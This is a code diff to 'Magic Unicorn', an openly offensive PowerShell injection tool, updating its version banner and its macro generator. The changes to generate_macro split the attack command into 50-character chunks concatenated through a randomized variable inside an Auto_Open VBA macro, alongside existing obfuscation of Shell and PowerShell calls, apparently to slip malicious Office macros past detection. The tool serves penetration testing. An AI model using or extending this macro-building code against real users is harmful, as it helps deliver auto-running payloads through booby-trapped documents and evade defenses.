@@ -491,7 +491,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.6.3 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.6.4 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -576,7 +576,7 @@ def scramble_stuff():
     return full_exe + "," + ps_only + "," + full_wscript + "," + full_shell
 
 # generate full macro
-def generate_macro(full_attack, line_length=780):
+def generate_macro(full_attack, line_length=50):
 
     # randomize macro name
     macro_rand = generate_random_string(5, 10)
@@ -585,22 +585,28 @@ def generate_macro(full_attack, line_length=780):
     macro_str = ("Sub Auto_Open()\nDim {0}\n{1} = ".format(macro_rand, macro_rand))
 
     if line_length is None:
-        line_length_int = 800
+        line_length_int = 50
     else:
         line_length_int = int(line_length)
 
     powershell_command_list = split_str(full_attack, line_length_int)
 
+    counter = 0
     for line in powershell_command_list:
-        macro_str += "& \"" + line + "\" _\n"
+        if counter == 0:
+            macro_str += " \"" + line + "\"\n"
+        if counter >= 1:
+            macro_str += macro_rand + " = " + macro_rand + " + \"" + line + "\"\n"
+
+        counter = counter + 1
 
     # remove trailing "_ \r\n"
-    macro_str = macro_str[:-4]
+    #macro_str = macro_str[:-4]
     # remove first occurrence of &
-    macro_str = macro_str.replace("& ", "", 1)
+    #macro_str = macro_str.replace("& ", "", 1)
     macro_str = macro_str.replace('powershell /w 1 /C "', r' /w 1 /C ""')
     #macro_str = macro_str.replace('/w 1', "") # no longer needed
-    macro_str = macro_str.replace("')", "')\"\"")
+    macro_str = macro_str.replace("')", "')\"")
 
     # obfsucate the hell out of Shell and PowerShell
     long_string = scramble_stuff().split(",")
